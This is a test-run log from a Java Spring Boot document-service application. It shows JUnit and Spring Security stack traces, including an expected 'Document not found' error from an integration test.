	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596) ~[na:na]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47) ~[junit-platform-launcher-1.10.1.jar:1.10.1]
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122) ~[surefire-junit-platform-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507) ~[surefire-booter-3.1.2.jar:3.1.2]
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495) ~[surefire-booter-3.1.2.jar:3.1.2]

2026-01-17T23:26:45.033Z ERROR 89700 --- [shipflow] [           main] c.g.f.shipflow.service.DocumentService   : Error extracting text from pdf file: Error: End-of-File, expected line at offset 16
2026-01-17T23:26:45.034Z  INFO 89700 --- [shipflow] [           main] c.g.f.shipflow.service.DocumentService   : Document uploaded successfully: test-pitch.pdf (pdf)
2026-01-17T23:26:45.054Z ERROR 89700 --- [shipflow] [           main] c.g.f.s.e.GlobalExceptionHandler         : Unexpected runtime exception: Document not found: 99999

java.lang.RuntimeException: Document not found: 99999
	at com.github.farzadsedaghatbin.shipflow.service.DocumentService.lambda$0(DocumentService.java:287) ~[classes/:na]
	at java.base/java.util.Optional.orElseThrow(Optional.java:403) ~[na:na]
	at com.github.farzadsedaghatbin.shipflow.service.DocumentService.getDocumentById(DocumentService.java:287) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.DocumentService.downloadDocument(DocumentService.java:312) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(AopUtils.java:352) ~[spring-aop-6.1.2.jar:6.1.2]
	at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:713) ~[spring-aop-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.service.DocumentService$$SpringCGLIB$$0.downloadDocument(<generated>) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.controller.DocumentController.downloadDocument(DocumentController.java:181) ~[classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:262) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:190) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:118) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:917) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:829) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1089) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:979) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1014) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:903) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:564) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:885) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.TestDispatcherServlet.service(TestDispatcherServlet.java:72) ~[spring-test-6.1.2.jar:6.1.2]
	at jakarta.servlet.http.HttpServlet.service(HttpServlet.java:658) ~[tomcat-embed-core-10.1.17.jar:6.0]
	at org.springframework.mock.web.MockFilterChain$ServletFilterProxy.doFilter(MockFilterChain.java:165) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:110) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:108) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.FilterChainProxy.lambda$doFilterInternal$3(FilterChainProxy.java:231) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$FilterObservation$SimpleFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:479) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$1(ObservationFilterChainDecorator.java:340) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator.lambda$wrapSecured$0(ObservationFilterChainDecorator.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:128) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.intercept.AuthorizationFilter.doFilter(AuthorizationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:126) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:120) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:131) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:85) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:100) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:179) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.JwtAuthenticationFilter.doFilterInternal(JwtAuthenticationFilter.java:46) ~[classes/:na]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at com.github.farzadsedaghatbin.shipflow.security.MaliciousHeaderFilter.doFilter(MaliciousHeaderFilter.java:83) ~[classes/:na]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:107) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:93) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CorsFilter.doFilterInternal(CorsFilter.java:91) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:82) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.SecurityContextHolderFilter.doFilter(SecurityContextHolderFilter.java:69) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:62) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:227) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.session.DisableEncodeUrlFilter.doFilterInternal(DisableEncodeUrlFilter.java:42) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.wrapFilter(ObservationFilterChainDecorator.java:240) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$AroundFilterObservation$SimpleAroundFilterObservation.lambda$wrap$0(ObservationFilterChainDecorator.java:323) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$ObservationFilter.doFilter(ObservationFilterChainDecorator.java:224) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.ObservationFilterChainDecorator$VirtualFilterChain.doFilter(ObservationFilterChainDecorator.java:137) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:233) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:191) ~[spring-security-web-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.servlet.handler.HandlerMappingIntrospector.lambda$createCacheFilter$3(HandlerMappingIntrospector.java:195) ~[spring-webmvc-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter$VirtualFilterChain.doFilter(CompositeFilter.java:113) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CompositeFilter.doFilter(CompositeFilter.java:74) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.security.config.annotation.web.configuration.WebMvcSecurityConfiguration$CompositeFilterChainProxy.doFilter(WebMvcSecurityConfiguration.java:225) ~[spring-security-config-6.2.1.jar:6.2.1]
	at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:352) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:268) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.ServerHttpObservationFilter.doFilterInternal(ServerHttpObservationFilter.java:109) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:116) ~[spring-web-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.setup.MockMvcFilterDecorator.doFilter(MockMvcFilterDecorator.java:151) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.mock.web.MockFilterChain.doFilter(MockFilterChain.java:132) ~[spring-test-6.1.2.jar:6.1.2]
	at org.springframework.test.web.servlet.MockMvc.perform(MockMvc.java:201) ~[spring-test-6.1.2.jar:6.1.2]
	at com.github.farzadsedaghatbin.shipflow.controller.DocumentControllerIntegrationTest.downloadDocument_withNonExistentId_shouldReturnNotFound(DocumentControllerIntegrationTest.java:209) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73) ~[junit-platform-engine-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
